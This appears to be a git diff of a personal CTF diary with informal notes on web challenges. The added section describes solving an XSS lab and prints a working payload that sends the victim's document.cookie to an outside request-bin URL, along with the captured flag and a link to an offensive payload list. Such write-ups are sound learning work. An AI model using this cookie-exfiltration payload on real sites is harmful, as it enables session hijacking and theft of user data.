@@ -1,6 +1,11 @@
 #view it in code mode for a smoother exp =)
-warning , quite the extreme language usage forward as i mainly document challneges that i get stuck on , therefore a lil venting after challenge si quite essential 
+warning , quite the extreme language usage forward as i mainly document challneges that i get stuck on , therefore a lil venting after challenge is quite essential 
+This is more for self notes for me to refer back in the future if i by chance get somewhat stuck 
 
+
+
+
+# ---  n.d
 alright its 3 50 in the fcuking morning idk what better to do than ctf instad of sleeping, writeup time....
 
 curl -X POST -d "username=admin&pass -d=71up-dnlkadsf" http://165.227.106.113/post.php
@@ -18,26 +23,10 @@ i like to call them notes or better known as references , writeup too formal for
 for now this thing is named the bloodflame archive cuz i have no idea what to name it while also listening to ERB (would have been an amazing pun if i was writting thsi on ARCH instaed of ubuntu...)
 y'knwo what , maybe this can be known better as my CTF diary since i yap so much bs here ahhahaa
 aaaaaaaaany ways since i last formatted pc , i lost all my progress(diary) on SKR, gotta redo it here , for now this is all i have , im a poor man , poor of information 
-its 4 01 , my sleep is fucked, i havent finished my dailies , im going to sleep , need to contol the ctf addiction !!!
+its 4 01 , my sleep is fked, i havent finished my dailies , im going to sleep , need to contol the ctf addiction !!!
 
 
-# kk challenge 2 
-another curl challange yay!!!
-first try was -> curl http://165.227.106.113/header.php
-- error got error saying wrong user agent , so curl mentioned that i can specify an agent (whatever that is) to enter the site.
-so i tried curl --user-agent Sup3rS3cr3tAg3nt http://165.227.106.113/header.php which used the agent given by the site
-- next error says i did not come from a site called awesomesauce.com (how dare he discriminate me)
-therefore after some bs and more bs , i figured that i couuld use a referer
-found out using curl -help all   which btw shows all functions of curl
-then the command become like this and the flag came out idk how hahahha 
-
-curl -e awesomesauce.com  --user-agent Sup3rS3cr3tAg3nt http://165.227.106.113/header.php
-
-challenge link -> https://ctflearn.com/challenge/109
-
-yup thats all , fair diffuculty for meduim , my brain not too fucked HAHHAHA
-
-# challange 3
+# --- n.d
 I HAVE TO SAY , NO WEED OR GACHA PULLS SHOULD BE ABLE TO BEAT THE HIGH I JUST FELT SOLVING MY FIRST HARD CHALLANGE 
 alright so heres the story and challenge link : https://ctflearn.com/challenge/149
 so yeah this gonna be a long story , future me or whoever i share this with , get ready
@@ -116,16 +105,9 @@ it returned the information of the first dog and the flag
 
 alright thats a grandfather level story , time to rest , enough games today 
 
-# 4 
-okok legit final oen for today
-challenge -> https://ctflearn.com/challenge/691
-
-this one quite simple, nc commect to the server , play the betting game 
-simple concept of betting , guess a number, win = ur money + initial bet, loose = initial money - bet
-so if 500 - 500 = 1000 , that explains all i need to redeem the flag 
 
 
-# 5
+# --- n.d
 OK next one , this one not fully solve by me thanks to a community fella in their dc server , still gotta record this thing down for fun
 This ctf is a indi one called 3108 , merdeka themed
 challenge link (not sure how long it will be up) = https://b1bf68f7fd.bahterasiber.my/
@@ -177,9 +159,43 @@ if ($conn->connect_error) {
 echo "Connected successfully";
 ?>
 
-# 6
+# --- sep26-27 2024
 i spent wayyyyyyyyyyyyyyyyyyyyyyyy too much time on this bs
+this one is a challenge from SKR -> https://skrctf.me/challenges#XSS-GPT 
+had to literally go through piles of writeups just to get to the flag 
+references (totally not in APA)
+https://ctftime.org/writeup/15817 
+https://portswigger.net/web-security/cross-site-scripting/reflected#reflected-xss-in-different-contexts
+https://github.com/InfoSecWarrior/Offensive-Payloads/blob/main/Cross-Site-Scripting-XSS-Payloads.txt
 
+special thankyou to postbin -> https://www.postb.in/
+
+challenge starts of with a white ass site with a chat box and a report admin button
+after reading the html, you are somewhat required to have an API key (which i have 0 idea on wtf it is) 
+so i tried editing the parameter as one of the hints say and spammed random things into the apiKey parameter in the site, none worked as expected....
+then i tried the classic xss to trigger alert and it worked, as in the entire site bugged out with a wall of error messages.
+
+After some revisiting of the js, i had to change to payload to </script><script>alert("ayane")</script><script> for it to successfully trigger the xss
+which then also completely broke the site
+then i figured by clicking the report admin button (while the site is not broken) would send a post request to a page called reportAdmin with the api key parameter
+
+after being stuck on the same thing for quite a while (2 hrs) i went to check out some wwriteups 
+thats where i learnet that i can use postbin/webhook in combination with XSS to capture and send data to a given site 
+
+after aa lot of spamming different payloads , this one worked (url encoded)
+
+also first time making a code block here, yay
+```
+</script><script>var i=new Image;i.src="https://www.postb.in/1727372628601-9432018648367/?c="+document.cookie;</script><script>
+```
+
+then i replaced the kep parameter in the post request to the reportAdmin page and checked my postbin site , and there was the flag 
+SKR{R3flec73D_1n_API_k3y_f4ae0d}
+
+time to learn more on hwo this backend stuf and API work
+anyways ending this on a good note, heres a banger i listened to while scritching my head -> https://youtu.be/DZTXaq23534
+
+quick take away to self, please please please inspect the code carefully and if possible in visual studio code so you dont miss any pages or fucntion....
 
 
 
